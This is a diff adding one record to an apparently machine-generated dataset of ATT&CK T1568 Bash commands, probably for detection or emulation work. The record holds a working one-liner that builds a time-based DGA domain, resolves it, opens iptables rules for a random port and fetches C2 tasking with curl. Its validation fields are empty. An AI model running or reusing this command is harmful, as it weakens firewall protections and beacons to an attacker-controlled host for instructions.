@@ -1,0 +1,24 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "bash -c 'base=$(date -u +%s | sha256sum | cut -c1-6).rotor.net; cname=$(dig +short CNAME \"$base\" | tail -n1); target=${cname:-$base}; ip=$(dig +short A \"$target\" | shuf -n1); if [ -n \"$ip\" ]; then port=$(awk \"BEGIN{srand(); print int(1024+rand()*48000)}\"); iptables -I OUTPUT -p tcp -d \"$ip\" --dport \"$port\" -j ACCEPT; iptables -I INPUT -p tcp -s \"$ip\" --sport \"$port\" -j ACCEPT; curl -fsS --retry 0 \"http://$target:$port/task\"; fi'",
+  "explanation": "Leverages CNAME indirection to dynamically pivot to a rotating endpoint, resolves to an IP, permits the IP:port via iptables, and fetches tasks over an unusual port.",
+  "rationale_steps": [
+    "Create DGA subdomain",
+    "Follow CNAME to discover the current target",
+    "Resolve target A record to get an IP",
+    "Insert iptables rules for that dynamic IP and random port",
+    "Fetch tasking data using curl on the resolved host"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-10f87baa-4bcb3863",
+  "source_prompt_hash": "10f87baa",
+  "timestamp_utc": "2025-09-30T09:41:35.067898Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
